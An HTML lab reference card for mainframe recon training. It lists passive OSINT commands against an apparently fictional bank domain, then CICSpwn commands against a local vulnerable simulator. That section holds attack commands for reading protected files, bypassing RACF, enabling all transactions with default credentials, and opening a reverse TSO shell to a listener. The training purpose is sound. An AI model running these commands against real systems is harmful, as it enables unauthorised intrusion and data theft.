@@ -1,0 +1,896 @@
+<title>Mainframe Recon Lab Card</title>
+<meta name="description" content="Keyboard-side command reference for the eZrecon and CICSpwn mainframe recon labs, set up and tested on macOS.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans+Condensed:wght@500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+
+<style>
+  /* ---------- tokens: light is the bare :root ---------- */
+  :root {
+    --bg: #f2f4ef;
+    --surface: #ffffff;
+    --inset: #eef1ea;
+    --border: #d7ddd0;
+    --border-strong: #c3ccba;
+
+    --text: #1a221d;
+    --text-muted: #566257;
+    --text-faint: #7c8a7e;
+
+    --green: #1f8b50;
+    --green-ink: #16673b;
+    --green-bg: #e6f2ea;
+    --amber: #8f5e12;
+    --amber-bg: #f4ecdc;
+    --danger: #b83f30;
+    --danger-bg: #f7e5e2;
+
+    --accent: var(--green);
+
+    --font-sans: 'IBM Plex Sans', system-ui, -apple-system, Segoe UI, sans-serif;
+    --font-cond: 'IBM Plex Sans Condensed', var(--font-sans);
+    --font-mono: 'IBM Plex Mono', ui-monospace, 'SF Mono', Menlo, monospace;
+
+    --measure: 64ch;
+    --shadow: 0 1px 2px rgba(20, 40, 28, .06), 0 8px 24px -12px rgba(20, 40, 28, .12);
+  }
+
+  /* dark: OS default (no stamp) + explicit dark choice */
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #090d0b;
+      --surface: #101712;
+      --inset: #0b110d;
+      --border: #232f28;
+      --border-strong: #33443a;
+
+      --text: #dde8e0;
+      --text-muted: #8ba295;
+      --text-faint: #5d7166;
+
+      --green: #4bd583;
+      --green-ink: #7fe6ab;
+      --green-bg: #10231a;
+      --amber: #ffb000;
+      --amber-bg: #2a2007;
+      --danger: #ff6f61;
+      --danger-bg: #2c1411;
+
+      --shadow: 0 1px 2px rgba(0, 0, 0, .4), 0 10px 30px -12px rgba(0, 0, 0, .55);
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #090d0b;
+    --surface: #101712;
+    --inset: #0b110d;
+    --border: #232f28;
+    --border-strong: #33443a;
+
+    --text: #dde8e0;
+    --text-muted: #8ba295;
+    --text-faint: #5d7166;
+
+    --green: #4bd583;
+    --green-ink: #7fe6ab;
+    --green-bg: #10231a;
+    --amber: #ffb000;
+    --amber-bg: #2a2007;
+    --danger: #ff6f61;
+    --danger-bg: #2c1411;
+
+    --shadow: 0 1px 2px rgba(0, 0, 0, .4), 0 10px 30px -12px rgba(0, 0, 0, .55);
+  }
+
+  * { box-sizing: border-box; }
+  @media (prefers-reduced-motion: reduce) {
+    * { transition: none !important; animation: none !important; }
+  }
+
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-sans);
+    font-size: 15px;
+    line-height: 1.62;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrap {
+    max-width: 68rem;
+    margin: 0 auto;
+    padding: 0 clamp(1rem, 4vw, 2.75rem) 5rem;
+  }
+
+  /* ---------- masthead ---------- */
+  .masthead {
+    position: relative;
+    border-bottom: 1px solid var(--border-strong);
+    background:
+      linear-gradient(180deg, color-mix(in srgb, var(--green-bg) 55%, transparent), transparent 70%),
+      var(--bg);
+  }
+  .masthead .wrap { padding-top: clamp(2rem, 5vw, 3.4rem); padding-bottom: clamp(1.6rem, 4vw, 2.4rem); }
+  .eyebrow {
+    font-family: var(--font-cond);
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: .16em;
+    font-size: .72rem;
+    color: var(--text-faint);
+    margin: 0 0 .6rem;
+  }
+  .eyebrow b { color: var(--accent); font-weight: 600; }
+  h1 {
+    font-family: var(--font-sans);
+    font-weight: 600;
+    font-size: clamp(1.9rem, 4.4vw, 2.5rem);
+    line-height: 1.1;
+    letter-spacing: -.015em;
+    text-wrap: balance;
+    margin: 0 0 .7rem;
+  }
+  h1 .tick { color: var(--accent); }
+  .lede {
+    max-width: var(--measure);
+    color: var(--text-muted);
+    margin: 0 0 1.4rem;
+    font-size: 1rem;
+  }
+  .lede code { font-family: var(--font-mono); font-size: .86em; color: var(--text); }
+
+  .facts {
+    display: flex;
+    flex-wrap: wrap;
+    gap: .5rem .55rem;
+    align-items: center;
+  }
+  .chip {
+    display: inline-flex;
+    align-items: baseline;
+    gap: .5ch;
+    font-family: var(--font-mono);
+    font-size: .78rem;
+    padding: .32rem .6rem;
+    border: 1px solid var(--border-strong);
+    background: var(--surface);
+    border-radius: 2px;
+    white-space: nowrap;
+  }
+  .chip .k {
+    font-family: var(--font-cond);
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    font-size: .66rem;
+    color: var(--text-faint);
+  }
+  .chip.pass { border-color: color-mix(in srgb, var(--green) 45%, var(--border)); }
+  .chip.pass .k { color: var(--green-ink); }
+  .chip.act { border-color: color-mix(in srgb, var(--amber) 55%, var(--border)); }
+  .chip.act .k { color: var(--amber); }
+
+  .theme-toggle {
+    position: absolute;
+    top: clamp(1rem, 4vw, 1.6rem);
+    right: clamp(1rem, 4vw, 2.75rem);
+    font-family: var(--font-cond);
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    font-size: .68rem;
+    color: var(--text-muted);
+    background: var(--surface);
+    border: 1px solid var(--border-strong);
+    border-radius: 2px;
+    padding: .4rem .7rem;
+    cursor: pointer;
+  }
+  .theme-toggle:hover { color: var(--text); border-color: var(--accent); }
+
+  /* ---------- rules banner ---------- */
+  .roe {
+    display: flex;
+    gap: .9rem;
+    align-items: flex-start;
+    margin-top: 2rem;
+    padding: .95rem 1.1rem;
+    background: var(--danger-bg);
+    border: 1px solid color-mix(in srgb, var(--danger) 40%, var(--border));
+    border-left-width: 3px;
+    border-radius: 2px;
+    font-size: .92rem;
+  }
+  .roe .mark {
+    font-family: var(--font-cond);
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    font-size: .72rem;
+    color: var(--danger);
+    padding-top: .12rem;
+    white-space: nowrap;
+  }
+  .roe p { margin: 0; color: var(--text); }
+
+  /* ---------- sections ---------- */
+  section { margin-top: 3.4rem; }
+  .sec-head {
+    display: flex;
+    align-items: baseline;
+    gap: .8rem;
+    border-top: 1px solid var(--border-strong);
+    padding-top: 1rem;
+    margin-bottom: 1.4rem;
+  }
+  .sec-num {
+    font-family: var(--font-mono);
+    font-weight: 500;
+    font-size: .8rem;
+    color: var(--accent);
+    letter-spacing: .04em;
+  }
+  .sec-head h2 {
+    font-family: var(--font-sans);
+    font-weight: 600;
+    font-size: 1.16rem;
+    letter-spacing: -.01em;
+    margin: 0;
+    flex: 1;
+  }
+  .sec-head .aside {
+    font-family: var(--font-mono);
+    font-size: .76rem;
+    color: var(--text-faint);
+  }
+  .sec-intro { max-width: var(--measure); color: var(--text-muted); margin: -.4rem 0 1.4rem; font-size: .95rem; }
+  .sec-intro code { font-family: var(--font-mono); font-size: .85em; color: var(--text); }
+
+  /* ---------- key/value table ---------- */
+  .scroll { overflow-x: auto; border: 1px solid var(--border); border-radius: 2px; background: var(--surface); }
+  table { border-collapse: collapse; width: 100%; font-size: .88rem; }
+  th, td { text-align: left; padding: .6rem .85rem; vertical-align: top; border-bottom: 1px solid var(--border); }
+  tbody tr:last-child td, tbody tr:last-child td { border-bottom: 0; }
+  thead th {
+    font-family: var(--font-cond);
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    font-size: .68rem;
+    color: var(--text-faint);
+    font-weight: 600;
+    background: var(--inset);
+    position: sticky;
+    top: 0;
+  }
+  td.mono, th.mono { font-family: var(--font-mono); font-variant-numeric: tabular-nums; }
+  td.mono { color: var(--text); }
+  tbody tr:nth-child(even) td { background: color-mix(in srgb, var(--inset) 45%, transparent); }
+  .t-sym { font-family: var(--font-mono); font-size: .82rem; color: var(--danger); white-space: nowrap; }
+
+  /* ---------- command blocks ---------- */
+  .cmd {
+    position: relative;
+    background: var(--inset);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    margin: .5rem 0 0;
+  }
+  .cmd pre {
+    margin: 0;
+    padding: .7rem 3.4rem .7rem .85rem;
+    overflow-x: auto;
+    font-family: var(--font-mono);
+    font-size: .82rem;
+    line-height: 1.7;
+    color: var(--text);
+    tab-size: 2;
+  }
+  .cmd pre .c { color: var(--text-faint); }
+  .cmd pre .p { color: var(--accent); }
+  .copy {
+    position: absolute;
+    top: .45rem;
+    right: .45rem;
+    font-family: var(--font-cond);
+    text-transform: uppercase;
+    letter-spacing: .08em;
+    font-size: .62rem;
+    color: var(--text-muted);
+    background: var(--surface);
+    border: 1px solid var(--border-strong);
+    border-radius: 2px;
+    padding: .28rem .5rem;
+    cursor: pointer;
+    line-height: 1;
+  }
+  .copy:hover { color: var(--text); border-color: var(--accent); }
+  .copy[data-state="ok"] { color: var(--green-ink); border-color: var(--green); }
+
+  /* ---------- lab list ---------- */
+  .labs { display: flex; flex-direction: column; }
+  .lab {
+    display: grid;
+    grid-template-columns: 15rem 1fr;
+    gap: .2rem 1.6rem;
+    padding: 1.15rem 0;
+    border-top: 1px solid var(--border);
+  }
+  .lab:first-child { border-top: 0; }
+  .lab-id { }
+  .lab-name { font-weight: 600; font-size: .95rem; display: block; margin-bottom: .3rem; }
+  .lab-purpose { color: var(--text-muted); font-size: .86rem; }
+  .lab-body { min-width: 0; }
+  .tag {
+    display: inline-block;
+    font-family: var(--font-cond);
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    font-size: .6rem;
+    font-weight: 600;
+    padding: .16rem .42rem;
+    border-radius: 2px;
+    margin-bottom: .45rem;
+  }
+  .tag.pass { background: var(--green-bg); color: var(--green-ink); }
+  .tag.act { background: var(--amber-bg); color: var(--amber); }
+  .note { color: var(--text-muted); font-size: .86rem; margin: .55rem 0 0; }
+  .note code, .lab-purpose code, .note b { font-family: var(--font-mono); font-size: .9em; color: var(--text); font-weight: 400; }
+  .note b { color: var(--text); font-weight: 600; }
+
+  ul.keys {
+    list-style: none;
+    margin: .4rem 0 0;
+    padding: 0;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(13rem, 1fr));
+    gap: .35rem .9rem;
+    font-size: .85rem;
+  }
+  ul.keys li { color: var(--text-muted); }
+  ul.keys kbd {
+    font-family: var(--font-mono);
+    font-size: .82em;
+    background: var(--inset);
+    border: 1px solid var(--border-strong);
+    border-bottom-width: 2px;
+    border-radius: 3px;
+    padding: .05rem .4rem;
+    color: var(--text);
+    margin-right: .5ch;
+  }
+
+  footer {
+    margin-top: 4rem;
+    border-top: 1px solid var(--border-strong);
+    padding-top: 1.2rem;
+    font-family: var(--font-mono);
+    font-size: .76rem;
+    color: var(--text-faint);
+    line-height: 1.8;
+  }
+  footer b { color: var(--text-muted); font-weight: 500; }
+
+  a { color: var(--accent); text-underline-offset: 2px; }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 2px; }
+
+  @media (max-width: 640px) {
+    .lab { grid-template-columns: 1fr; gap: .5rem; }
+    .theme-toggle { position: static; display: inline-block; margin-bottom: 1.2rem; }
+    .masthead { position: relative; }
+  }
+
+  @media print {
+    :root {
+      --bg: #fff; --surface: #fff; --inset: #f4f4f2; --border: #ccc; --border-strong: #999;
+      --text: #111; --text-muted: #333; --text-faint: #666;
+      --green: #17673b; --green-ink: #17673b; --green-bg: #eaf3ee;
+      --amber: #7a4f0e; --amber-bg: #f3ecdd; --danger: #9a2f22; --danger-bg: #f6e7e4;
+      --shadow: none;
+    }
+    .theme-toggle, .copy { display: none; }
+    .lab, tr, .roe, section { break-inside: avoid; }
+    .cmd pre { white-space: pre-wrap; word-break: break-word; }
+    body { font-size: 10.5pt; }
+  }
+</style>
+
+<header class="masthead">
+  <div class="wrap">
+    <button class="theme-toggle" type="button" aria-label="Toggle colour theme">Theme</button>
+    <p class="eyebrow"><b>Field reference</b> &nbsp;/&nbsp; EZrecon-2 &nbsp;·&nbsp; Hacking Mainframes companion labs</p>
+    <h1>Mainframe Recon Lab <span class="tick">Card</span></h1>
+    <p class="lede">Everything to run the EZrecon-2 labs from the keyboard. Set up and smoke-tested
+      on this MacBook Pro: Apple Silicon, macOS 26, Homebrew Python 3.14, <code>ezrecon</code>
+      2.23.4 via pipx. <b>eZrecon</b> is by Kev Milne and Phil Young; <b>CICSpwn</b> by Ayoub
+      Elaassal. See Credits at the foot.</p>
+    <div class="facts">
+      <span class="chip pass"><span class="k">eZrecon target</span> sighberbank.com</span>
+      <span class="chip act"><span class="k">CICSpwn target</span> GIBSON · 127.0.0.1:23 · CICS</span>
+      <span class="chip"><span class="k">legend</span> <span style="color:var(--green-ink)">passive</span> / <span style="color:var(--amber)">active = needs authorisation</span></span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <div class="roe">
+    <span class="mark">Rules of engagement</span>
+    <p>Active checks change state or touch the target. Run them only against systems you own or
+      are explicitly authorised to test. GIBSON is a deliberately vulnerable simulator that
+      exists so you can practise the CICS techniques safely; it is not permission to test
+      anything else.</p>
+  </div>
+
+  <!-- WHERE THINGS LIVE -->
+  <section id="paths">
+    <div class="sec-head">
+      <span class="sec-num">§</span>
+      <h2>Where things live</h2>
+    </div>
+    <div class="scroll">
+      <table>
+        <thead>
+          <tr><th>Component</th><th>Path / command</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>eZrecon command</td><td class="mono">ezrecon &nbsp;(pipx → ~/.local/bin/ezrecon, v2.23.4)</td></tr>
+          <tr><td>eZrecon source</td><td class="mono">~/git/Ezrecon/ezrecon-src/</td></tr>
+          <tr><td>CICSpwn</td><td class="mono">~/git/Ezrecon/cicspwn/ &nbsp;→ run <b>./cicspwn</b> (venv wrapper)</td></tr>
+          <tr><td>CICSpwn lab guide</td><td class="mono">~/git/Ezrecon/cicspwn/CICSpwn-Lab-Guide.pdf</td></tr>
+          <tr><td>nmap + mainframe NSE</td><td class="mono">Homebrew; 17 mainframe scripts bundled</td></tr>
+          <tr><td>s3270 (drives CICSpwn)</td><td class="mono">Homebrew; s3270 on PATH</td></tr>
+          <tr><td>SearXNG (keyless search)</td><td class="mono">docker: ezrecon-searxng → http://localhost:10080</td></tr>
+          <tr><td>eZrecon config</td><td class="mono">~/.config/ezrecon/config.json</td></tr>
+          <tr><td>GIBSON simulator</td><td class="mono">~/git/GIBSON/gibson-mainframe/ &nbsp;→ ./run_gibson.sh</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 01 PRE-FLIGHT -->
+  <section id="preflight">
+    <div class="sec-head">
+      <span class="sec-num">01</span>
+      <h2>Start of day — pre-flight</h2>
+      <span class="aside">run before the room fills</span>
+    </div>
+    <p class="sec-intro"><b>Fast path:</b> <code>./setup.sh</code> once per machine, then
+      <code>./start.sh --gibson</code> each day, then <code>./status.sh</code> for the all-green check.
+      The block below is what those scripts automate.</p>
+    <div class="cmd">
+      <button class="copy" type="button">copy</button>
+<pre><span class="c"># 1 · eZrecon is alive</span>
+ezrecon --version                     <span class="c"># → EZRecon 2.23.4</span>
+
+<span class="c"># 2 · nmap + the mainframe scripts are visible to eZrecon</span>
+ezrecon nse list | grep -E 'cics|tso|drda|tn3270|vtam'
+
+<span class="c"># 3 · SearXNG is up  (start Docker Desktop first if needed)</span>
+ezrecon searx status                  <span class="c"># Container running: True / JSON API: True</span>
+<span class="c">#   if not:  ezrecon searx setup --yes --port 10080</span>
+
+<span class="c"># 4 · keys — only for the keyed labs, skip otherwise</span>
+ezrecon config set shodan_api_key  &lt;key&gt;
+ezrecon config set google_api_key  &lt;key&gt;
+ezrecon config set google_cse_id   &lt;id&gt;
+ezrecon config set hibp_api_key    &lt;key&gt;
+ezrecon config show
+
+<span class="c"># 5 · CICSpwn labs — start GIBSON, then confirm port 23 answers</span>
+cd ~/git/GIBSON/gibson-mainframe &amp;&amp; ./run_gibson.sh   <span class="c"># separate terminal</span>
+nc -z 127.0.0.1 23 &amp;&amp; echo "GIBSON 3270 is listening"</pre>
+    </div>
+  </section>
+
+  <!-- 02 eZrecon LABS -->
+  <section id="ezrecon">
+    <div class="sec-head">
+      <span class="sec-num">02</span>
+      <h2>eZrecon labs</h2>
+      <span class="aside">target · sighberbank.com</span>
+    </div>
+    <p class="sec-intro">All passive and keyless unless tagged. Append <code>--report ./out</code> to any
+      command to also write <code>md</code> + <code>html</code> + <code>json</code> + <code>queries.txt</code> + a graph.</p>
+
+    <div class="labs">
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 0 — first sweep</span><span class="lab-purpose">The whole passive chain in one run.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon auto sighberbank.com --report ./out
+ezrecon graph ./out/ezrecon_sighberbank_com.json --out ./out/g.html</pre></div>
+          <p class="note">Read the reds in the table first — those are the leads. Then open the graph and pivot from a high-value node.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">DNS</span><span class="lab-purpose">Records, SPF/DMARC, zone transfer.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon dns sighberbank.com</pre></div>
+          <p class="note">MX = mail provider. TXT entries naming middleware or gateways in front of z/OS. Any AXFR that succeeds hands you the whole map.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">WHOIS</span><span class="lab-purpose">Registration record.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon whois sighberbank.com</pre></div>
+          <p class="note">Registrar, creation date, name servers. A redacted registrant is normal. Thin behind a firewall that blocks port 43.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Subdomains</span><span class="lab-purpose">Brute + keyless passive sources.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon subdomains sighberbank.com
+<span class="c"># --no-brute for passive only · --wordlist &lt;file&gt; for depth</span></pre></div>
+          <p class="note">Gateway- and mainframe-looking hostnames. Feed a promising one into <b>MyMap</b> once you have authorisation.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">crt.sh</span><span class="lab-purpose">Certificate transparency logs.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon crtsh sighberbank.com</pre></div>
+          <p class="note">Internal-looking names a wordlist would never guess. Compare against the brute list. crt.sh rate-limits — retry if empty.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Wayback</span><span class="lab-purpose">Archived URLs from the Internet Archive.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon wayback sighberbank.com</pre></div>
+          <p class="note">Archived JCL / COBOL / config / backup files, and pages deleted from the live site but still captured.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Document metadata</span><span class="lab-purpose">Authors and software from public docs.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon docmeta sighberbank.com</pre></div>
+          <p class="note">Author / last-modified-by usernames are candidate TSO or RACF userids. Note software versions too.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">People harvest</span><span class="lab-purpose">Emails, names, inferred naming pattern.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon harvest sighberbank.com --deep</pre></div>
+          <p class="note">A handful of confirmed addresses plus a few names gives you a userid list via the inferred pattern.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Takeover</span><span class="lab-purpose">Dangling DNS / subdomain takeover.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon takeover sighberbank.com
+<span class="c"># DNS-only. --http to confirm is active and gated.</span></pre></div>
+          <p class="note">A <b>HIGH</b> result is a hostname an attacker could serve content from as the organisation.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Google dorks</span><span class="lab-purpose">Mainframe dork catalogue.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon dork sighberbank.com --all --links
+<span class="c"># add --fetch for real results via SearXNG</span></pre></div>
+          <p class="note"><code>--links</code> always works. Fresh SearXNG gets throttled by upstreams; a Google CSE key makes <code>--fetch</code> reliable.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">GitHub dorks</span><span class="lab-purpose">Code-search scoped to the org.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon github sighberbank.com --org &lt;org&gt;
+<span class="c"># --fetch needs a GitHub token</span></pre></div>
+          <p class="note">Query links for leaked copybooks and connection strings.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">AI OSINT prompt</span><span class="lab-purpose">Structured prompt from the session.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon prompt sighberbank.com</pre></div>
+          <p class="note">Paste into an assistant for a fast second read on what matters after a busy run.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Shodan sweep</span><span class="lab-purpose">Mainframe fingerprints Shodan already holds.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span> <span class="tag act">needs key</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon shodan --mainframe sighberbank.com</pre></div>
+          <p class="note">No packet sent by you — this reads Shodan's existing scans.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">CTI news</span><span class="lab-purpose">Mainframe security feeds.</span></div>
+        <div class="lab-body">
+          <span class="tag pass">passive</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon rss</pre></div>
+          <p class="note">Anything tied to the target in the week's mainframe security news.</p>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- 03 ACTIVE RECON -->
+  <section id="active">
+    <div class="sec-head">
+      <span class="sec-num">03</span>
+      <h2>Active recon</h2>
+      <span class="aside">authorised hosts only</span>
+    </div>
+
+    <div class="labs">
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Native banner grab</span><span class="lab-purpose">Connect + banner + mainframe fingerprint. No nmap, no root.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon ports &lt;host&gt;
+ezrecon ports &lt;host&gt; --ports 23,992,446,447,448,3270,50000</pre></div>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">NSE command builder</span><span class="lab-purpose">Build an nmap command from a book preset. Prints it; you run it.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>ezrecon nse build --preset mainframe-sweep &lt;host&gt;
+ezrecon nse build --preset tn3270 &lt;host&gt;
+ezrecon nse build --preset db2-drda &lt;host&gt; --script-arg drda-brute.dbname=CBSA</pre></div>
+          <p class="note">The TUI <b>MyMap</b> screen (<code>n</code>) is where you actually run NSE scans — it has a Run button with a confirm.
+            Lab: <code>n</code> → <b>MAINFRAME</b> → <code>tso-enum</code> → read its args → set target and <code>-p 23</code> on the <code>$ nmap</code> line → Run → Report.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="sec-head" style="margin-top:2rem">
+      <span class="sec-num">·</span>
+      <h2 style="font-size:1rem">TUI keys</h2>
+      <span class="aside">run <code style="font-family:var(--font-mono)">ezrecon</code> in Terminal.app / iTerm</span>
+    </div>
+    <ul class="keys">
+      <li><kbd>r</kbd> run module</li>
+      <li><kbd>a</kbd> auto-recon</li>
+      <li><kbd>e</kbd> report screen</li>
+      <li><kbd>k</kbd> API-key vault</li>
+      <li><kbd>p</kbd> preview a dork</li>
+      <li><kbd>g</kbd> entity graph</li>
+      <li><kbd>o</kbd> options</li>
+      <li><kbd>n</kbd> MyMap (nmap)</li>
+      <li><kbd>s</kbd> CTI RSS</li>
+      <li><kbd>t</kbd> notepad</li>
+      <li><kbd>F1</kbd> help + per-module lab</li>
+      <li><kbd>c</kbd> clear table</li>
+      <li><kbd>q</kbd> quit</li>
+    </ul>
+  </section>
+
+  <!-- 04 CICSpwn LABS -->
+  <section id="cicspwn">
+    <div class="sec-head">
+      <span class="sec-num">04</span>
+      <h2>CICSpwn labs</h2>
+      <span class="aside">GIBSON · 127.0.0.1 23 · APPLID CICS</span>
+    </div>
+    <p class="sec-intro">Run from <code>~/git/Ezrecon/cicspwn/</code>. The lab guide writes <code>./cicspwn.py</code>;
+      on this Mac use <code>./cicspwn</code> — a wrapper that picks the venv Python that has <code>py3270</code>.
+      Everything after that matches the guide.</p>
+    <div class="cmd"><button class="copy" type="button">copy</button><pre>cd ~/git/Ezrecon/cicspwn</pre></div>
+
+    <div class="labs" style="margin-top:1.4rem">
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 0 — first contact</span><span class="lab-purpose">Confirm you can reach the CICS terminal.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>./cicspwn -a CICS 127.0.0.1 23 -i</pre></div>
+          <p class="note">Expect <code>[+] Connecting to target 127.0.0.1:23</code> then <code>[*] Access to CICS Terminal is possible with APPID CICS</code>.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 1 — recon (-i)</span><span class="lab-purpose">Fingerprint the region.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>./cicspwn -a CICS 127.0.0.1 23 -i</pre></div>
+          <p class="note">Reachable txns (CEMT / CEDA / CECI…), z/OS 2.05 / CICS TS 73, Sysid GIB1, HLQ <code>GIBSON.BANK.**</code>, active users, spool, ESM present.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 2 — TS queue enum (-e)</span><span class="lab-purpose">List temporary-storage queues and depth.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>./cicspwn -a CICS 127.0.0.1 23 -e</pre></div>
+          <p class="note">A <code>Tsqueue Items Length Transaction</code> table (GIBSON, BANKAUD, PWNLOG). If blocked, retry with <code>--bypass</code>.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 3 — read a VSAM file</span><span class="lab-purpose">Turn a file readable and read it.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>./cicspwn -a CICS 127.0.0.1 23 --get-file FILEA
+./cicspwn -a CICS 127.0.0.1 23 --get-file FILEB</pre></div>
+          <p class="note">FILEA reads straight away. FILEB starts closed — CICSpwn flips it <code>OPEN ENA READ</code> via CEMT, then reads it.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 4 — RACF bypass</span><span class="lab-purpose">Copy protected txns to unprotected names.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>./cicspwn -a CICS 127.0.0.1 23 -e --bypass</pre></div>
+          <p class="note"><code>CEMT → CSPS</code> and <code>CECI → CSPK</code> copied and installed via CEDA. Lab 2 then works even where it was blocked.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 5 — enable transactions</span><span class="lab-purpose">Re-enable disabled transactions.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>./cicspwn -a CICS 127.0.0.1 23 --enable-tran ALL</pre></div>
+          <p class="note">Expect <code>[+] Activating ALL transactions</code>. Swap <code>ALL</code> for a single txn id to enable just one.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 6 — authenticated ops</span><span class="lab-purpose">Sign on before acting.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>./cicspwn -a CICS 127.0.0.1 23 -U IBMUSER -P SYS1 --enable-tran ALL</pre></div>
+          <p class="note">Needs GIBSON in realistic-auth mode so it presents CESN on connect. Otherwise: "could not find a password field", continues unauthenticated.</p>
+        </div>
+      </div>
+
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Lab 7 — TSO shell via spool</span><span class="lab-purpose">Command channel through the internal reader. Advanced.</span></div>
+        <div class="lab-body">
+          <span class="tag act">active</span>
+          <div class="cmd"><button class="copy" type="button">copy</button><pre>./cicspwn -a CICS 127.0.0.1 23 -s reverse_tso -l &lt;your-ip&gt;:4445
+./cicspwn -a CICS 127.0.0.1 23 -s direct_tso</pre></div>
